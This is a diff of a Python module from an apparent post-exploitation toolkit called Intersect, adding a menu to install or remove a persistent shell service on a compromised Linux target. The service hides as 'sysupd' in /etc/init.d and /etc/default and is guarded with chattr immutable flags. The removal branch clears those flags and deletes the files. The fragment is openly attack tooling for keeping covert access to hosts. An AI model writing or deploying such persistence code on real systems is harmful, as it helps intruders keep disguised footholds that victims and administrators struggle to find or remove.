@@ -2,6 +2,31 @@
 # Lets you install an Intersect shell as a persistent service on the target. You must define your shell type and file location when prompted.
 def persistent():
 	header = " => "
+	print("Select option: ")
+	print("1. Add new service")
+	print("2. Remove existing persistence")
+	option = raw_input("%s " % (header))
+
+	if option == '1':
+		addpersist()
+	elif option == '2':
+		if os.path.exists("/etc/init.d/sysupd") is True:
+			print("[+] Removing Intersect persistence...")
+			if whereis('chattr') is not None:
+				os.system("chattr -i /etc/init.d/sysupd")
+				os.system("chattr -i /etc/default/sysupd")
+			os.system("rm /etc/init.d/sysupd")
+			os.system("update-rc.d sysupd remove")
+			os.system("rm /etc/default/sysupd")
+			print("[+] Persistent shell successfully removed!")
+		else:
+			print("[!] No existing persistent shell found!")
+	else:
+		print("[!] Invalid option! Enter '1' or '2'")
+
+	
+def addpersist():
+	header = " => "
 	print("Full path of your Intersect script: ")
 	currentfile = raw_input("%s " % (header))
 
